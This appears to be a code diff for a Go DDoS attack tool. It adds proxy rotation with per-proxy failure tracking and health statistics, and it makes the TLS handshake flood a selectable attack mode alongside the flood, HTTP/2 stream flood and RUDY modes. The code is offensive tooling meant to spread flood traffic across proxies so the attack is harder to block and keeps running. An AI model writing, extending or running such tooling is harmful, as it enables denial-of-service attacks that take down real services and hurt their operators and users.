@@ -42,7 +42,15 @@ func New(config DDoSConfig) *DDoSAttack {
 	}
 
 	attack := &DDoSAttack{
-		config: config,
+		config:         config,
+		proxyFailures:  make(map[string]int),
+		proxyDisabled:  make(map[string]bool),
+		proxyFailLimit: 5, // mark proxy unhealthy after 5 consecutive failures
+	}
+
+	// Initialize proxy list snapshot for this attack instance
+	if len(config.ProxyList) > 0 {
+		attack.proxies = append([]string(nil), config.ProxyList...)
 	}
 
 	// Load user agents (custom from file or built-in)
@@ -87,12 +95,6 @@ func (d *DDoSAttack) Start(ctx context.Context) error {
 	// Start progress reporter
 	go d.reportProgress()
 
-	// Check if TLS handshake flood is enabled
-	if d.config.UseTLSAttack && d.config.TLSHandshakeFlood {
-		d.startTLSHandshakeFlood()
-		return nil
-	}
-
 	// Start workers based on attack mode
 	switch d.config.AttackMode {
 	case ModeFlood:
@@ -109,6 +111,8 @@ func (d *DDoSAttack) Start(ctx context.Context) error {
 		d.startHTTP2StreamFlood()
 	case ModeRUDY:
 		d.startRUDYAttack()
+	case ModeTLSHandshakeFlood:
+		d.startTLSHandshakeFlood()
 	}
 
 	return nil
@@ -145,6 +149,21 @@ func (d *DDoSAttack) GetStats() AttackStats {
 		rps = float64(sent) / elapsed.Seconds()
 	}
 
+	// Compute proxy health stats
+	activeProxies := 0
+	disabledProxies := 0
+	if len(d.proxies) > 0 {
+		d.proxyMu.Lock()
+		for _, p := range d.proxies {
+			if d.proxyDisabled[p] {
+				disabledProxies++
+			} else {
+				activeProxies++
+			}
+		}
+		d.proxyMu.Unlock()
+	}
+
 	return AttackStats{
 		RequestsSent:      sent,
 		RequestsSuccess:   atomic.LoadInt64(&d.requestsSuccess),
@@ -155,7 +174,58 @@ func (d *DDoSAttack) GetStats() AttackStats {
 		AvgResponseTime:   avgRespTime,
 		ElapsedTime:       elapsed,
 		RequestsPerSec:    rps,
+		ActiveProxies:     activeProxies,
+		DisabledProxies:   disabledProxies,
 	}
+}
+
+// getNextProxy returns the next healthy proxy for rotation, or false if none available.
+func (d *DDoSAttack) getNextProxy() (string, bool) {
+	if len(d.proxies) == 0 {
+		return "", false
+	}
+
+	// Try up to len(proxies) times to find a non-disabled proxy
+	for i := 0; i < len(d.proxies); i++ {
+		idx := atomic.AddInt64(&d.proxyIndex, 1) - 1
+		p := d.proxies[int(idx)%len(d.proxies)]
+
+		d.proxyMu.Lock()
+		disabled := d.proxyDisabled[p]
+		d.proxyMu.Unlock()
+
+		if !disabled {
+			return p, true
+		}
+	}
+
+	return "", false
+}
+
+// markProxyFailure records a failed request for the given proxy and may mark it unhealthy.
+func (d *DDoSAttack) markProxyFailure(proxy string) {
+	if proxy == "" {
+		return
+	}
+	d.proxyMu.Lock()
+	defer d.proxyMu.Unlock()
+
+	failures := d.proxyFailures[proxy] + 1
+	d.proxyFailures[proxy] = failures
+	if failures >= d.proxyFailLimit {
+		d.proxyDisabled[proxy] = true
+	}
+}
+
+// markProxySuccess resets the failure counter for a proxy on successful use.
+func (d *DDoSAttack) markProxySuccess(proxy string) {
+	if proxy == "" {
+		return
+	}
+	d.proxyMu.Lock()
+	defer d.proxyMu.Unlock()
+
+	d.proxyFailures[proxy] = 0
 }
 
 // IsRunning returns whether the attack is currently running
@@ -185,4 +255,3 @@ func (d *DDoSAttack) reportProgress() {
 		}
 	}
 }
-
